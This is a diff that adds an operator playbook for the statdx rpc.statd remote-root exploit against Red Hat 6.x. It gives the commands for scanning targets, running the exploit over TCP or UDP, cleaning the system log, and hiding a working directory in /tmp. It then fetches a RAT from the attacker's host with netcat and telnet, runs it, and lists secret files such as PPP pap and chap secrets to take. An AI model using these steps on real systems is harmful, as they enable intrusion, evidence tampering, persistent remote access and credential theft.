@@ -1,0 +1,132 @@
+### statdx (originally) by ron1n
+###
+### Modified to be TCP by default, and TCP code has been modified
+###   to reuse the initial RPC connection for your session...cool.
+###
+### Usage: ./statdx [-r proc] [-u] [-p port] [-a addr] [-l len]
+###         [-o offset] [-w num] [-s secs] [-d type] <target>
+### -r      remote procedure to smack...choices are:
+###         1       SM_STAT (the default)
+###         2       SM_MON.........vulnerable, but not smackable yet
+###         3       SM_UNMON.......vulnerable, but not smackable yet
+###         4       SM_UNMON_ALL...vulnerable, but not smackable yet
+###         NOTE    SM_SIMU_CRASH(5) and SM_NOTIFY(6) are NOT vulnerable
+### -u      attack a udp dispatcher [tcp]
+### -p      rpc.statd serves requests on <port> [query]
+### -a      the stack address of the buffer is <addr>
+### -l      the length of the buffer is <len> [1024]
+### -o      the offset to return to is <offset> [600]
+### -w      the number of dwords to wipe is <num> [9]
+### -s      set timeout in seconds to <secs> [5]
+### -d      use a hardcoded <type>
+### Available types:
+### 0       Redhat 6.2 (nfs-utils-0.1.6-2)
+### 1       Redhat 6.1 (knfsd-1.4.7-7)
+### 2       Redhat 6.0 (knfsd-1.2.2-4)
+
+*** Don't forget to use "sgrep" to clean the whopper log entry
+*** you'll leave in "/var/log/messages" as a results of your
+*** "statdx" attack...
+
+## Using "nmap" to scan for "rpc.statd" on your target? Say, for example,
+##   a scan of TCP ports 600 through 699, 'cause "portmapper" ain't talkin'?
+nmap -sS -p600-699 TARGETIP
+rpcinfo -n TARGETPORT -t TARGETIP 100024
+
+*** 
+*** From a Linux box........."statdx" is really "statdx.linux"
+*** From a Solaris 2.X box..."statdx" is really "statdx.sparc"
+*** 
+
+## If doing a TCP attack to a Redhat 6.2 target w/port (PREFERRED!!!)...
+# Smack...
+statdx -d 0 -p TARGETPORT TARGETIP
+
+## If doing a TCP attack to a Redhat 6.2 target wo/port...
+# Smack...
+statdx -d 0 TARGETIP
+
+## If doing a UDP attack to a Redhat 6.2 target...
+## NOTE -- the UDP attack will require another connection, from
+##         your local IP to the target's port 38912 (used to be
+##         port 39168 with the default publicly known exploit, 
+##         but this port started showing up in IDS rulesets, go
+##         figure...STUPID WORM!!!!!!).
+
+# Verify that the subsequent TCP connection will work...
+telnet TARGETIP 38912
+# Smack...
+statdx -d 0 -u TARGETPORT TARGETIP
+--- or ---
+statdx -d 0 -u TARGETIP
+
+### Once "root"...restart the "rpc.statd"...be a considerate hacker...
+
+## Upload the appropriate restart script from ../bin on LOCALIP
+##
+## 6.2 (Zoot):     ../bin/restart.62.sh --> rs; chmod 700 rs
+## 6.1 (Cartman):  ../bin/restart.61.sh --> rs; chmod 700 rs
+## 6.0 (Hedwig):   ../bin/restart.60.sh --> rs; chmod 700 rs
+##
+## NOTE -- If you upload and execute the WRONG restart script,
+##         you may be unable to attack "rpc.statd" until your
+##         system reboots, due to a hosed buffer address.
+
+## 6.2 (Zoot) (nfs-utils-0.1.6-2)
+ps -ef |grep rpc
+/usr/sbin/lsof |grep ^sh
+0<&- 1<&- 2<&- rs
+ps -ef |grep rpc
+/usr/sbin/lsof | grep rpc.statd
+
+## 6.1 (Cartman) (knfsd-1.4.7-7)
+ps -ef |grep rpc
+/usr/sbin/lsof |grep ^sh
+0<&- 1<&- 2<&- rs
+ps -ef |grep rpc
+/usr/sbin/lsof | grep rpc.statd
+
+## 6.0 (Hedwig) (knfsd-1.2.2-4)
+ps -ef |grep rpc
+/usr/sbin/lsof |grep ^sh
+0<&- 1<&- 2<&- 3<&- 4<&- 5<&- 7<&- 9<&- 21<&- rs
+ps -ef |grep rpc
+/usr/sbin/lsof | grep rpc.statd
+
+###
+### Time to upload your RAT of choice...make working directory...
+id
+mkdir /tmp/.X11R6; chmod 700 /tmp/.X11R6; ls -la /tmp
+
+chown root:root /tmp/.X11R6; ls -la /tmp
+** or, for GNOME (if you see other "gdm" stuff in "/tmp"...) **
+chown root:gdm /tmp/.X11R6; ls -la /tmp
+
+## Start up your "netcat" on your attack hosts, ala...
+ls -l httpd.uu
+nc -l -p 31117 < httpd.uu
+
+## Move into our working directory, then call back for the RAT...
+cd /tmp/.X11R6; pwd
+telnet LOCALIP 31117 > httpd.uu
+uudecode httpd.uu && uncompress httpd.Z && chmod 700 httpd; ls -la
+0<&- 1<&- 2<&- PATH=. httpd
+rm httpd httpd.uu; ls -la
+
+### Connect from your local IP
+
+### Outta here...
+###   
+exit 0
+
+### Grab
+## /boot most everythig, but probably just what's related in lilo.conf
+## /lib/modules
+## /etc/modules.conf or conf.modules
+## /etc/lilo.conf
+## /etc/ppp/pap-secrets /etc/ppp/chap-secrets
+## /etc/redhat-release or any release file like that.
+## /etc/{any other conf files?}
+
+### List /usr/src for any linux or rpm source info
+## Run lilo -q
